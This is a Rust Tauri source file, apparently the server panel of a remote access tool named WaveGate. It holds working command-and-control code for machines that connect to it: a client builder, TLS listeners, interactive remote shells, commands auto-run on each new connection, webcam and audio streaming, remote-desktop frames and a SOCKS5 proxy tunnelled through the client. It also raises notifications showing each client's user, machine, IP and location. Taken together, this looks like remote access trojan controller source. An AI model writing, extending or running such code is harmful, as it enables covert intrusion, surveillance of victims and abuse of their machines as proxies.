// Prevents additional console window on Windows in release builds
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod builder;
mod client;
mod commands;
mod crypto;
mod handler;
mod listener;
mod logging;
mod protocol;
mod proxy;
mod settings;
mod websocket;

use std::sync::Arc;
use parking_lot::RwLock;
use serde::{Deserialize, Serialize};
use tauri::{Emitter, State};

use client::{ClientRegistry, ClientInfo, ClientEvent};
use commands::{CommandRouter, SharedCommandRouter};
use crypto::{init_certificate, generate_certificate, save_certificate, CertificateData, CertInitResult};
use handler::{timeout_checker, ShellEvent};
use listener::ListenerManager;
use logging::{LogStore, LogEntry, SharedLogStore};
use proxy::{ProxyRegistry, SharedProxyRegistry};
use settings::{AppSettings, SharedSettings};
use tokio::sync::mpsc;
use tauri_winrt_notification::Toast;

/// Application state shared across Tauri commands
struct AppState {
    listener_manager: Arc<ListenerManager>,
    certificate: Arc<RwLock<Option<CertificateData>>>,
    configured_ports: Arc<RwLock<Vec<u16>>>,
    log_store: SharedLogStore,
    command_router: SharedCommandRouter,
    settings: SharedSettings,
    proxy_registry: SharedProxyRegistry,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct KeyInfo {
    public_key: String,
    private_key: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct PortStatusInfo {
    port: u16,
    enabled: bool,
    connections: u32,
}

// ClientInfo is now imported from client module

/// Initialize or load certificates on startup
#[tauri::command]
fn init_keys(state: State<AppState>) -> Result<KeyInfo, String> {
    let cert_result = init_certificate().map_err(|e| {
        state.log_store.error(format!("Failed to initialize certificates: {}", e));
        e.to_string()
    })?;

    // Log whether certificates were loaded or generated
    if cert_result.was_loaded {
        state.log_store.success(format!(
            "Certificates loaded from {}",
            cert_result.path.display()
        ));
    } else {
        state.log_store.success(format!(
            "Certificates generated and saved to {}",
            cert_result.path.display()
        ));
    }

    // Configure TLS in listener manager
    state.listener_manager
        .configure_tls(&cert_result.data.cert_pem, &cert_result.data.key_pem)
        .map_err(|e| e.to_string())?;

    let key_info = KeyInfo {
        public_key: cert_result.data.cert_base64.clone(),
        private_key: cert_result.data.key_base64.clone(),
    };

    *state.certificate.write() = Some(cert_result.data);

    Ok(key_info)
}

/// Regenerate certificates
#[tauri::command]
fn regenerate_keys(state: State<AppState>) -> Result<KeyInfo, String> {
    let cert_data = generate_certificate().map_err(|e| e.to_string())?;
    save_certificate(&cert_data).map_err(|e| e.to_string())?;

    // Reconfigure TLS
    state.listener_manager
        .configure_tls(&cert_data.cert_pem, &cert_data.key_pem)
        .map_err(|e| e.to_string())?;

    let key_info = KeyInfo {
        public_key: cert_data.cert_base64.clone(),
        private_key: cert_data.key_base64.clone(),
    };

    *state.certificate.write() = Some(cert_data);

    Ok(key_info)
}

/// Get current keys
#[tauri::command]
fn get_keys(state: State<AppState>) -> Result<KeyInfo, String> {
    let cert = state.certificate.read();
    match cert.as_ref() {
        Some(cert_data) => Ok(KeyInfo {
            public_key: cert_data.cert_base64.clone(),
            private_key: cert_data.key_base64.clone(),
        }),
        None => Err("Keys not initialized".to_string()),
    }
}

/// Start a listener on a port
#[tauri::command]
async fn start_listener(port: u16, state: State<'_, AppState>) -> Result<(), String> {
    state.listener_manager
        .start_listener(port)
        .await
        .map_err(|e| e.to_string())?;

    // Add to configured ports if not already there
    let mut ports = state.configured_ports.write();
    if !ports.contains(&port) {
        ports.push(port);
    }

    Ok(())
}

/// Stop a listener on a port
#[tauri::command]
async fn stop_listener(port: u16, state: State<'_, AppState>) -> Result<(), String> {
    state.listener_manager
        .stop_listener(port)
        .await
        .map_err(|e| e.to_string())
}

/// Get status of all ports
#[tauri::command]
fn get_port_statuses(state: State<AppState>) -> Vec<PortStatusInfo> {
    let ports = state.configured_ports.read();
    state.listener_manager
        .get_port_statuses(&ports)
        .into_iter()
        .map(|s| PortStatusInfo {
            port: s.port,
            enabled: s.enabled,
            connections: s.connections,
        })
        .collect()
}

/// Add a port to configuration
#[tauri::command]
fn add_port(port: u16, state: State<AppState>) -> Result<(), String> {
    let mut ports = state.configured_ports.write();
    if ports.contains(&port) {
        return Err("Port already configured".to_string());
    }
    ports.push(port);
    Ok(())
}

/// Remove a port from configuration
#[tauri::command]
async fn remove_port(port: u16, state: State<'_, AppState>) -> Result<(), String> {
    // Stop listener if running
    let _ = state.listener_manager.stop_listener(port).await;

    // Remove from configured ports
    let mut ports = state.configured_ports.write();
    ports.retain(|&p| p != port);

    Ok(())
}

/// Get connected clients
#[tauri::command]
fn get_clients(state: State<AppState>) -> Vec<ClientInfo> {
    state.listener_manager
        .client_registry()
        .get_all_clients()
}

// ============ Logging Commands ============

/// Get all log entries
#[tauri::command]
fn get_logs(state: State<AppState>) -> Vec<LogEntry> {
    state.log_store.get_all()
}

/// Get log entries since a timestamp
#[tauri::command]
fn get_logs_since(since_timestamp: u64, state: State<AppState>) -> Vec<LogEntry> {
    state.log_store.get_since(since_timestamp)
}

/// Clear all logs
#[tauri::command]
fn clear_logs(state: State<AppState>) {
    state.log_store.clear();
}

// ============ Settings Commands ============

/// Get current settings
#[tauri::command]
fn get_settings(state: State<AppState>) -> AppSettings {
    state.settings.read().clone()
}

/// Save settings
#[tauri::command]
fn save_settings(new_settings: AppSettings, state: State<AppState>) -> Result<(), String> {
    // Update configured ports from settings
    {
        let mut ports = state.configured_ports.write();
        *ports = new_settings.ports.clone();
    }

    // Save to state
    {
        let mut settings = state.settings.write();
        *settings = new_settings;
    }

    // Persist to disk
    state.settings.read().save().map_err(|e| e.to_string())
}

// ============ Builder Commands ============

/// Build a client with the specified configuration
#[tauri::command]
async fn build_client(request: builder::BuildRequest, state: State<'_, AppState>) -> Result<builder::BuildResult, String> {
    state.log_store.info(format!("Starting client build: {}", request.build_id));

    // Run build in blocking task to not block the async runtime
    let result = tokio::task::spawn_blocking(move || {
        builder::build_client(&request)
    })
    .await
    .map_err(|e| format!("Build task failed: {}", e))?;

    if result.success {
        state.log_store.success(format!(
            "Client built successfully: {}",
            result.output_path.as_deref().unwrap_or("unknown")
        ));
    } else {
        state.log_store.error(format!(
            "Client build failed: {}",
            result.error.as_deref().unwrap_or("unknown error")
        ));
    }

    Ok(result)
}

/// Send a command to a specific client
#[tauri::command]
async fn send_command(uid: String, command: wavegate_shared::CommandType, state: State<'_, AppState>) -> Result<String, String> {
    let registry = state.listener_manager.client_registry();

    let sender = registry.get_command_sender_by_uid(&uid)
        .ok_or_else(|| format!("Client not found: {}", uid))?;

    // Get client info for logging
    let client_ip = registry.get_client_by_uid(&uid)
        .map(|c| c.ip)
        .unwrap_or_else(|| "unknown".to_string());

    // Get command name for logging
    let cmd_name = crate::commands::get_command_type_name(&command);

    // Generate command ID
    let command_id = uuid::Uuid::new_v4().to_string();

    let cmd_msg = wavegate_shared::CommandMessage {
        id: command_id.clone(),
        command,
    };

    sender.send(cmd_msg).await
        .map_err(|e| format!("Failed to send command: {}", e))?;

    state.log_store.info(format!(
        "Sent command: {} ({}) to client {} ({})",
        cmd_name, command_id, uid, client_ip
    ));

    Ok(command_id)
}

// ============ Shell Commands ============

/// Start an interactive shell session on a client
#[tauri::command]
async fn start_shell(uid: String, state: State<'_, AppState>) -> Result<String, String> {
    let registry = state.listener_manager.client_registry();

    let sender = registry.get_command_sender_by_uid(&uid)
        .ok_or_else(|| format!("Client not found: {}", uid))?;

    let command_id = uuid::Uuid::new_v4().to_string();

    let cmd_msg = wavegate_shared::CommandMessage {
        id: command_id.clone(),
        command: wavegate_shared::CommandType::ShellStart,
    };

    sender.send(cmd_msg).await
        .map_err(|e| format!("Failed to send command: {}", e))?;

    state.log_store.info(format!("Shell start requested for {}", uid));

    Ok(command_id)
}

/// Send input to an active shell session
#[tauri::command]
async fn send_shell_input(uid: String, data: String, state: State<'_, AppState>) -> Result<(), String> {
    let registry = state.listener_manager.client_registry();

    let sender = registry.get_command_sender_by_uid(&uid)
        .ok_or_else(|| format!("Client not found: {}", uid))?;

    let command_id = uuid::Uuid::new_v4().to_string();

    let cmd_msg = wavegate_shared::CommandMessage {
        id: command_id,
        command: wavegate_shared::CommandType::ShellInput { data },
    };

    sender.send(cmd_msg).await
        .map_err(|e| format!("Failed to send input: {}", e))?;

    Ok(())
}

/// Close an active shell session
#[tauri::command]
async fn close_shell(uid: String, state: State<'_, AppState>) -> Result<(), String> {
    let registry = state.listener_manager.client_registry();

    let sender = registry.get_command_sender_by_uid(&uid)
        .ok_or_else(|| format!("Client not found: {}", uid))?;

    let command_id = uuid::Uuid::new_v4().to_string();

    let cmd_msg = wavegate_shared::CommandMessage {
        id: command_id,
        command: wavegate_shared::CommandType::ShellClose,
    };

    sender.send(cmd_msg).await
        .map_err(|e| format!("Failed to send close: {}", e))?;

    state.log_store.info(format!("Shell close requested for {}", uid));

    Ok(())
}

// ============ Webcam Commands ============

/// Get list of media devices from a client
#[tauri::command]
async fn get_media_devices(uid: String, state: State<'_, AppState>) -> Result<String, String> {
    let registry = state.listener_manager.client_registry();

    let sender = registry.get_command_sender_by_uid(&uid)
        .ok_or_else(|| format!("Client not found: {}", uid))?;

    let command_id = uuid::Uuid::new_v4().to_string();

    let cmd_msg = wavegate_shared::CommandMessage {
        id: command_id.clone(),
        command: wavegate_shared::CommandType::ListMediaDevices,
    };

    sender.send(cmd_msg).await
        .map_err(|e| format!("Failed to send command: {}", e))?;

    state.log_store.info(format!("Media devices requested from {}", uid));

    Ok(command_id)
}

/// Start webcam stream on a client
#[tauri::command]
async fn start_webcam_stream(
    uid: String,
    video_device: Option<String>,
    audio_device: Option<String>,
    fps: u8,
    quality: u8,
    resolution: Option<String>,
    state: State<'_, AppState>,
) -> Result<String, String> {
    let registry = state.listener_manager.client_registry();

    let sender = registry.get_command_sender_by_uid(&uid)
        .ok_or_else(|| format!("Client not found: {}", uid))?;

    let command_id = uuid::Uuid::new_v4().to_string();

    let res_str = resolution.as_deref().unwrap_or("native").to_string();

    let cmd_msg = wavegate_shared::CommandMessage {
        id: command_id.clone(),
        command: wavegate_shared::CommandType::StartMediaStream {
            video_device,
            audio_device,
            fps,
            quality,
            resolution,
        },
    };

    sender.send(cmd_msg).await
        .map_err(|e| format!("Failed to send command: {}", e))?;

    state.log_store.info(format!("Webcam stream started for {} ({}fps, {}q, {})", uid, fps, quality, res_str));

    Ok(command_id)
}

/// Stop webcam stream on a client
#[tauri::command]
async fn stop_webcam_stream(uid: String, state: State<'_, AppState>) -> Result<String, String> {
    let registry = state.listener_manager.client_registry();

    let sender = registry.get_command_sender_by_uid(&uid)
        .ok_or_else(|| format!("Client not found: {}", uid))?;

    let command_id = uuid::Uuid::new_v4().to_string();

    let cmd_msg = wavegate_shared::CommandMessage {
        id: command_id.clone(),
        command: wavegate_shared::CommandType::StopMediaStream,
    };

    sender.send(cmd_msg).await
        .map_err(|e| format!("Failed to send command: {}", e))?;

    state.log_store.info(format!("Webcam stream stopped for {}", uid));

    Ok(command_id)
}

/// Open the builds folder in file explorer
#[tauri::command]
fn open_builds_folder() -> Result<(), String> {
    let exe_path = std::env::current_exe()
        .map_err(|e| e.to_string())?;

    // Try to find builds directory
    let mut current = exe_path.parent();
    while let Some(dir) = current {
        let builds_dir = dir.join("builds");
        if builds_dir.exists() {
            #[cfg(windows)]
            {
                std::process::Command::new("explorer")
                    .arg(&builds_dir)
                    .spawn()
                    .map_err(|e| e.to_string())?;
            }
            #[cfg(not(windows))]
            {
                std::process::Command::new("xdg-open")
                    .arg(&builds_dir)
                    .spawn()
                    .map_err(|e| e.to_string())?;
            }
            return Ok(());
        }
        current = dir.parent();
    }

    // Try current working directory
    let cwd = std::env::current_dir().map_err(|e| e.to_string())?;
    let builds_dir = cwd.join("builds");
    if !builds_dir.exists() {
        std::fs::create_dir_all(&builds_dir).map_err(|e| e.to_string())?;
    }

    #[cfg(windows)]
    {
        std::process::Command::new("explorer")
            .arg(&builds_dir)
            .spawn()
            .map_err(|e| e.to_string())?;
    }
    #[cfg(not(windows))]
    {
        std::process::Command::new("xdg-open")
            .arg(&builds_dir)
            .spawn()
            .map_err(|e| e.to_string())?;
    }

    Ok(())
}

/// Save file data to a user-selected location
#[tauri::command]
async fn save_file_with_dialog(filename: String, data: Vec<u8>) -> Result<bool, String> {
    use rfd::AsyncFileDialog;

    let dialog = AsyncFileDialog::new()
        .set_file_name(&filename)
        .set_title("Save File");

    if let Some(file) = dialog.save_file().await {
        std::fs::write(file.path(), &data)
            .map_err(|e| format!("Failed to write file: {}", e))?;
        Ok(true)
    } else {
        Ok(false) // User cancelled
    }
}

/// Proxy info returned to frontend
#[derive(Debug, Clone, Serialize, Deserialize)]
struct ProxyInfo {
    running: bool,
    address: Option<String>,
    port: Option<u16>,
    connections: usize,
}

/// Start SOCKS5 proxy for a client
#[tauri::command]
async fn start_proxy(uid: String, port: u16, state: State<'_, AppState>) -> Result<ProxyInfo, String> {
    // Verify client exists and has a proxy sender (set up by handler)
    let registry = state.listener_manager.client_registry();
    if registry.get_client_by_uid(&uid).is_none() {
        return Err(format!("Client not found: {}", uid));
    }

    // Check that the handler has set up a proxy sender
    let proxy_sender = registry.get_proxy_sender(&uid)
        .ok_or_else(|| "Client not ready for proxy (handler not fully initialized)".to_string())?;

    // Create channel for proxy manager to send messages to client
    let (to_client_tx, mut to_client_rx) = mpsc::channel::<proxy::ProxyToClient>(256);

    // Start the proxy server
    let addr = state.proxy_registry
        .start_proxy(uid.clone(), port, to_client_tx, state.log_store.clone())
        .await?;

    // Spawn task to forward proxy messages from proxy manager to the handler's ProxyMessage channel
    let uid_clone = uid.clone();
    let log_store = state.log_store.clone();
    tokio::spawn(async move {
        while let Some(msg) = to_client_rx.recv().await {
            let proxy_msg = match msg {
                proxy::ProxyToClient::Connect { conn_id, host, port } => {
                    client::ProxyMessage::Connect { conn_id, host, port }
                }
                proxy::ProxyToClient::ConnectTarget { conn_id, target } => {
                    client::ProxyMessage::ConnectTarget { conn_id, target }
                }
                proxy::ProxyToClient::Data { conn_id, data } => {
                    client::ProxyMessage::Data { conn_id, data }
                }
                proxy::ProxyToClient::Close { conn_id } => {
                    client::ProxyMessage::Close { conn_id }
                }
            };

            // Send to handler via the stored sender
            if proxy_sender.send(proxy_msg).await.is_err() {
                log_store.client_warning(&uid_clone, "Failed to send proxy message to handler - client disconnected?");
                break;
            }
        }
    });

    Ok(ProxyInfo {
        running: true,
        address: Some(addr.ip().to_string()),
        port: Some(addr.port()),
        connections: 0,
    })
}

/// Stop SOCKS5 proxy for a client
#[tauri::command]
fn stop_proxy(uid: String, state: State<AppState>) -> Result<bool, String> {
    let stopped = state.proxy_registry.stop_proxy(&uid);
    if stopped {
        state.log_store.client_info(&uid, "SOCKS5 proxy stopped");
    }
    Ok(stopped)
}

/// Get proxy status for a client
#[tauri::command]
fn get_proxy_status(uid: String, state: State<AppState>) -> ProxyInfo {
    if let Some((addr, connections)) = state.proxy_registry.get_proxy_info(&uid) {
        ProxyInfo {
            running: true,
            address: Some(addr.ip().to_string()),
            port: Some(addr.port()),
            connections,
        }
    } else {
        ProxyInfo {
            running: false,
            address: None,
            port: None,
            connections: 0,
        }
    }
}

fn main() {
    // Create the tokio runtime for async operations
    let runtime = tokio::runtime::Runtime::new().expect("Failed to create tokio runtime");

    // Create log store first so we can log
    let log_store: SharedLogStore = Arc::new(LogStore::new());

    // Log startup
    log_store.info("WaveGate server starting...");

    // Create client event channel for sounds/notifications (used by registry)
    let (client_event_tx, mut client_event_rx) = mpsc::channel::<ClientEvent>(64);

    // Create shared components - registry with event sender
    let client_registry = Arc::new(ClientRegistry::with_events(client_event_tx));

    // Load settings from disk (or use defaults)
    let settings_result = AppSettings::load();
    if settings_result.was_loaded {
        log_store.success(format!(
            "Settings loaded from {}",
            settings_result.path.display()
        ));
    } else {
        log_store.info(format!(
            "Using default settings (no config found at {})",
            settings_result.path.display()
        ));
    }
    let configured_ports = settings_result.settings.ports.clone();

    // Create shared settings
    let settings: SharedSettings = Arc::new(RwLock::new(settings_result.settings));

    let command_router: SharedCommandRouter = Arc::new(CommandRouter::new(
        client_registry.clone(),
        log_store.clone(),
    ));
    let command_router_for_autorun = command_router.clone();

    // Create shell event channel
    let (shell_event_tx, mut shell_event_rx) = mpsc::channel::<ShellEvent>(256);

    // Initialize listener manager and set up event senders
    let listener_manager = Arc::new(ListenerManager::new(client_registry.clone(), settings.clone(), log_store.clone()));
    listener_manager.set_shell_event_sender(shell_event_tx);

    // Initialize proxy registry
    let proxy_registry = Arc::new(ProxyRegistry::new());

    // Initialize application state
    let app_state = AppState {
        listener_manager,
        certificate: Arc::new(RwLock::new(None)),
        configured_ports: Arc::new(RwLock::new(configured_ports)),
        log_store: log_store.clone(),
        command_router,
        settings: settings.clone(),
        proxy_registry: proxy_registry.clone(),
    };

    // Spawn background timeout checker with settings
    let registry_for_timeout = client_registry.clone();
    let log_store_for_timeout = log_store.clone();
    let settings_for_timeout = settings.clone();
    runtime.spawn(async move {
        timeout_checker(registry_for_timeout, log_store_for_timeout, settings_for_timeout).await;
    });

    log_store.success("Server initialized successfully");

    // Get runtime handle for spawning tasks inside Tauri setup
    let runtime_handle = runtime.handle().clone();

    tauri::Builder::default()
        .manage(app_state)
        .setup(move |app| {
            // Clone settings for client event handler
            let settings_for_events = settings.clone();

            // Spawn task to handle client connection events (sounds/notifications/autorun)
            // These events come from the ClientRegistry directly
            let app_handle_for_clients = app.handle().clone();
            let command_router_for_events = command_router_for_autorun.clone();
            let log_store_for_events = log_store.clone();
            let runtime_handle_clone = runtime_handle.clone();
            runtime_handle_clone.spawn(async move {
                while let Some(event) = client_event_rx.recv().await {
                    let s = settings_for_events.read();
                    match event {
                        ClientEvent::Connected(ref info) => {
                            // Show Windows toast notification (must complete before any .await)
                            if s.notify_connect {
                                let title = "Client Connected";
                                let body = format!("{}@{} ({}) connected from {}",
                                    info.user, info.machine, info.ip, info.geo);
                                let _ = Toast::new(Toast::POWERSHELL_APP_ID)
                                    .title(title)
                                    .text1(&body)
                                    .show();
                            }
                            // Emit event to frontend for sound
                            if s.sound_new_client {
                                let _ = app_handle_for_clients.emit("client-connected", serde_json::json!({
                                    "uid": info.uid,
                                    "machine": info.machine,
                                    "playSound": true,
                                    "showNotification": false
                                }));
                            }
                            // Execute autorun commands if configured - spawn in separate task
                            if !s.autorun_commands.trim().is_empty() {
                                let uid = info.uid.clone();
                                let autorun_commands = s.autorun_commands.clone();
                                let command_router = command_router_for_events.clone();
                                let log_store = log_store_for_events.clone();
                                drop(s); // Release the lock before spawning

                                tokio::spawn(async move {
                                    log_store.client_info(&uid, "Executing autorun commands...");

                                    // Start a shell session and send the commands
                                    let start_cmd = wavegate_shared::CommandType::ShellStart;

                                    if let Ok(_) = command_router.send_command(&uid, start_cmd, None).await {
                                        // Give shell time to start
                                        tokio::time::sleep(std::time::Duration::from_millis(500)).await;

                                        // Send each line as input
                                        for line in autorun_commands.lines() {
                                            let trimmed = line.trim();
                                            if !trimmed.is_empty() && !trimmed.starts_with('#') {
                                                let input_cmd = wavegate_shared::CommandType::ShellInput {
                                                    data: format!("{}\r\n", trimmed),
                                                };
                                                let _ = command_router.send_command(&uid, input_cmd, None).await;
                                                // Small delay between commands
                                                tokio::time::sleep(std::time::Duration::from_millis(100)).await;
                                            }
                                        }

                                        // Close the shell after commands complete
                                        tokio::time::sleep(std::time::Duration::from_secs(2)).await;
                                        let close_cmd = wavegate_shared::CommandType::ShellClose;
                                        let _ = command_router.send_command(&uid, close_cmd, None).await;

                                        log_store.client_success(&uid, "Autorun commands completed");
                                    } else {
                                        log_store.client_warning(&uid, "Failed to start autorun shell");
                                    }
                                });
                            }
                        }
                        ClientEvent::Disconnected(info) => {
                            // Show Windows toast notification
                            if s.notify_disconnect {
                                let title = "Client Disconnected";
                                let body = format!("{}@{} ({}) disconnected",
                                    info.user, info.machine, info.ip);
                                let _ = Toast::new(Toast::POWERSHELL_APP_ID)
                                    .title(title)
                                    .text1(&body)
                                    .show();
                            }
                            // Emit event to frontend for sound
                            if s.sound_lost_client {
                                let _ = app_handle_for_clients.emit("client-disconnected", serde_json::json!({
                                    "uid": info.uid,
                                    "machine": info.machine,
                                    "playSound": true,
                                    "showNotification": false
                                }));
                            }
                        }
                        ClientEvent::Updated(_) => {
                            // Just trigger a client list refresh
                            let _ = app_handle_for_clients.emit("client-updated", serde_json::json!({}));
                        }
                    }
                }
            });

            // Spawn task to forward shell events to frontend and handle proxy events
            let app_handle = app.handle().clone();
            let proxy_registry_for_events = proxy_registry.clone();
            runtime_handle.spawn(async move {
                while let Some(event) = shell_event_rx.recv().await {
                    // Emit event to frontend based on type
                    match &event {
                        ShellEvent::Output { uid, data } => {
                            let _ = app_handle.emit("shell-output", serde_json::json!({
                                "uid": uid,
                                "data": data
                            }));
                        }
                        ShellEvent::Exit { uid, exit_code } => {
                            let _ = app_handle.emit("shell-exit", serde_json::json!({
                                "uid": uid,
                                "exitCode": exit_code
                            }));
                        }
                        ShellEvent::Response { uid, response } => {
                            let _ = app_handle.emit("shell-response", serde_json::json!({
                                "uid": uid,
                                "response": response
                            }));
                        }
                        ShellEvent::MediaFrame { uid, frame } => {
                            // Emit media frame to frontend - raw JPEG bytes (no base64 overhead)
                            let _ = app_handle.emit("media-frame", serde_json::json!({
                                "uid": uid,
                                "jpegData": frame.jpeg_data,
                                "width": frame.width,
                                "height": frame.height,
                                "timestampMs": frame.timestamp_ms
                            }));
                        }
                        ShellEvent::RemoteDesktopTileFrame { uid, frame } => {
                            // Emit tile-based remote desktop frame to frontend
                            let _ = app_handle.emit("remote-desktop-tile-frame", serde_json::json!({
                                "uid": uid,
                                "width": frame.width,
                                "height": frame.height,
                                "isKeyframe": frame.is_keyframe,
                                "tiles": frame.tiles
                            }));
                        }
                        ShellEvent::RemoteDesktopH264Frame { uid, frame } => {
                            // Emit H.264 remote desktop frame to frontend
                            let _ = app_handle.emit("remote-desktop-h264-frame", serde_json::json!({
                                "uid": uid,
                                "width": frame.width,
                                "height": frame.height,
                                "isKeyframe": frame.is_keyframe,
                                "timestampMs": frame.timestamp_ms,
                                "data": frame.data
                            }));
                        }
                        ShellEvent::ProxyConnectResult { uid, payload } => {
                            // Route to proxy manager
                            if let Some(manager) = proxy_registry_for_events.get_manager(uid) {
                                if let Ok(msg) = serde_json::from_slice::<wavegate_shared::ProxyConnectResultMessage>(payload) {
                                    manager.handle_client_message(proxy::ClientToProxy::ConnectResult {
                                        conn_id: msg.conn_id,
                                        success: msg.success,
                                        error: msg.error,
                                        bound_addr: msg.bound_addr,
                                        bound_port: msg.bound_port,
                                    });
                                }
                            }
                        }
                        ShellEvent::ProxyData { uid, payload } => {
                            // Route to proxy manager
                            if let Some(manager) = proxy_registry_for_events.get_manager(uid) {
                                if let Ok(msg) = serde_json::from_slice::<wavegate_shared::ProxyDataMessage>(payload) {
                                    // Decode base64 data
                                    if let Ok(data) = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, &msg.data) {
                                        manager.handle_client_message(proxy::ClientToProxy::Data {
                                            conn_id: msg.conn_id,
                                            data,
                                        });
                                    }
                                }
                            }
                        }
                        ShellEvent::ProxyClosed { uid, payload } => {
                            // Route to proxy manager
                            if let Some(manager) = proxy_registry_for_events.get_manager(uid) {
                                if let Ok(msg) = serde_json::from_slice::<wavegate_shared::ProxyClosedMessage>(payload) {
                                    manager.handle_client_message(proxy::ClientToProxy::Closed {
                                        conn_id: msg.conn_id,
                                        reason: msg.reason,
                                    });
                                }
                            }
                        }
                    }
                }
            });
            Ok(())
        })
        .invoke_handler(tauri::generate_handler![
            init_keys,
            regenerate_keys,
            get_keys,
            start_listener,
            stop_listener,
            get_port_statuses,
            add_port,
            remove_port,
            get_clients,
            get_logs,
            get_logs_since,
            clear_logs,
            get_settings,
            save_settings,
            build_client,
            open_builds_folder,
            send_command,
            start_shell,
            send_shell_input,
            close_shell,
            save_file_with_dialog,
            get_media_devices,
            start_webcam_stream,
            stop_webcam_stream,
            start_proxy,
            stop_proxy,
            get_proxy_status,
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
